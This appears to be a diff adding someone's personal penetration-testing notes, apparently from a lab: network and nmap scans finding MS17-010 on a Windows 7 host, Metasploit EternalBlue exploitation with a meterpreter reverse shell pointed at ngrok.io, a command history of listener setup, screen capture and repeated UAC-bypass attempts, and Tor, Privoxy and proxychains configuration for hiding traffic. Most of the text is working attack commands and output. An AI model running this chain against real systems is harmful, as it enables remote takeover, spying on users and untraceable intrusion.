@@ -1,0 +1,409 @@
+MSF Exploit+Payload [ RCE ]
+```````````````````````````
+
+1. Scan the network:
+--------------------
+# netdiscover -r 192.168.86.0/24
+
+Currently scanning: Finished!   |   Screen View: Unique Hosts
+
+ 8 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 480
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
+ -----------------------------------------------------------------------------
+ 192.168.86.1    00:50:56:c0:00:08      4     240  VMware, Inc.
+ 192.168.86.2    00:50:56:e0:3d:5f      2     120  VMware, Inc.
+ 192.168.86.131  00:0c:29:2e:47:9a      1      60  VMware, Inc.
+ 192.168.86.254  00:50:56:e0:6b:a6      1      60  VMware, Inc.
+
+
+Target: 
+192.168.86.131  00:0c:29:2e:47:9a      1      60  VMware, Inc.
+
+2) Port Scanning:
+-----------------
+# nmap -sSV 192.168.86.131
+
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-10 00:40 EST
+Nmap scan report for 192.168.86.131
+Host is up (0.00071s latency).
+Not shown: 991 closed tcp ports (reset)
+PORT      STATE SERVICE      VERSION
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49155/tcp open  msrpc        Microsoft Windows RPC
+49156/tcp open  msrpc        Microsoft Windows RPC
+49158/tcp open  msrpc        Microsoft Windows RPC
+MAC Address: 00:0C:29:2E:47:9A (VMware)
+Service Info: Host: WIN-QP4A15PF6T8; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 60.99 seconds
+
+
+3) Scan VULN using NMAP:
+------------------------
+# nmap -sV 192.168.86.131 --script vuln 
+
+Host script results:
+|_smb-vuln-ms10-054: false
+|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
+|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
+| smb-vuln-ms17-010:
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+
+
+4) Exploit using MSF:
+---------------------
+
+# msfconsole
+
+msf6> search ms17
+msf6 auxiliary(scanner/smb/smb_ms17_010) > show options
+
+Module options (auxiliary/scanner/smb/smb_ms17_010):
+
+   Name         Current Setting                        Required  Description
+   ----         ---------------                        --------  -----------
+   CHECK_ARCH   true                                   no        Check for architecture on vulnerable hosts
+   CHECK_DOPU   true                                   no        Check for DOUBLEPULSAR on vulnerable hosts
+   CHECK_PIPE   false                                  no        Check for named pipe on vulnerable hosts
+   NAMED_PIPES  /usr/share/metasploit-framework/data/  yes       List of named pipes to check
+                wordlists/named_pipes.txt
+   RHOSTS                                              yes       The target host(s), see https://github.com/rapid7/metasploit-frame
+                                                                 work/wiki/Using-Metasploit
+   RPORT        445                                    yes       The SMB service port (TCP)
+   SMBDomain    .                                      no        The Windows domain to use for authentication
+   SMBPass                                             no        The password for the specified username
+   SMBUser                                             no        The username to authenticate as
+   THREADS      1                                      yes       The number of concurrent threads (max one per host)
+
+msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 192.168.86.131
+msf6 auxiliary(scanner/smb/smb_ms17_010) > run
+[+] 192.168.86.131:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+[*] 192.168.86.131:445    - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+5) Exploit:
+-----------
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.86.131
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST ngrok.io
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 8899
+msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
+
+
+HISTORY:
+--------
+msf6 exploit(windows/local/bypassuac_eventvwr) > history 
+138  exploit
+139  exit
+140  use exploit/multi/handler
+141  set PAYLOAD windows/meterpreter/reverse_tcp
+142  set LHOST 192.168.86.128
+143  set LPORT 9898
+144  ex
+145  exploit
+146  use post/windows/gather/screen_spy
+147  show options
+148  set SESSION 1
+149  set RECORD false
+150  run
+151  show options
+152  set VIEW_SCREENSHOTS true
+153  run
+154  exit
+155  exot
+156  exit -y
+157  use exploit/multi/handler
+158  set PAYLOAD windows/meterpreter/reverse_tcp
+159  set LHOST 192.168.86.128
+160  set LPORT 9898
+161  exploit
+162  use post/windows/gather/screen_spy
+163  show options
+164  set RECORD false
+165  set VIEW_SCREENSHOTS true
+166  run
+167  set SESSION 1
+168  exploit
+169  use multi/handler
+170  set PAYLOAD windows/meterpreter/reverse_tcp
+171  set LHOST  19
+172  set LHOST  192.168.86.128
+173  set LPORT 9898
+174  exploit
+175  use exploit/windows/local/ms10_092_schelevator
+176  show options
+177  sessions -l
+178  set SESSION 1
+179  show options
+180  set LPORT 8989
+181  show options
+182  exploit
+183  show options
+184  exploit
+185  search uac
+186  use exploit/windows/local/bypassuac
+187  show options
+188  set SESSION
+189  set SESSION 2
+190  set SESSION 1
+191  show options
+192  show targets
+193  set target 1
+194  lshoop
+195  show options
+196  exploit
+197  sessions -l
+198  sessions 2
+199  sessions 1
+200  search uac
+201  use exploit/windows/local/bypassuac_injection
+202  show options
+203  set SESSION 1
+204  exploit
+205  set target 1
+206  show options
+207  exploit
+208  sessions -l
+209  sessions -i 2
+210  sessions -l
+211  show options
+212  set LPORT 9999
+213  exploit
+214  back
+215  search uac
+216  set Luse exploit/windows/local/bypassuac_vbs
+217  use exploit/windows/local/bypassuac_vbs
+218  show options
+219  set SESSION 1
+220  set LPORT 7676
+221  exploit
+222  sessions
+223  sessions -k 2
+224  exploit
+225  back
+226  search uac
+227  use exploit/windows/local/bypassuac_eventvwr
+228  exploit
+229  set SESSION 1
+230  exploit
+231  show options
+232  sessions
+233  set target 1
+234  show options
+235  exploit
+236  sessions -i 1
+_____________________________________________________________________
+
+Repeat:
+-------
+- TOR
+
+# apt install tor -y
+
+# vim /etc/tor/torrc
+Go to end of the file
+MaxCircuitDirtiness 10
+ExitNodes {UK}
+
+SOCKS : http
+SOCKS5: http(s)
+
+Port: 9050
+
+#  service tor start
+
+- Privoxy [ HTTP Tunneling ]
+
+# apt install privoxy -y
+
+# vim /etc/privoxy/config
+
+
+Uncomment:
+
+forward-socks5t ...... 127.0.0.1 9050
+
+:wq
+
+# service privoxy restart
+
+SETUP: FoxyProxy
+````````````````
+https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/
+
+
+- Proxychains
+
+# vim /etc/proxychains.conf
+Go to end of file and add
+
+socks5 127.0.0.1 9050
+http 127.0.0.1 8118
+
+# proxychains host cdac.in
+_______________________________________________________
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
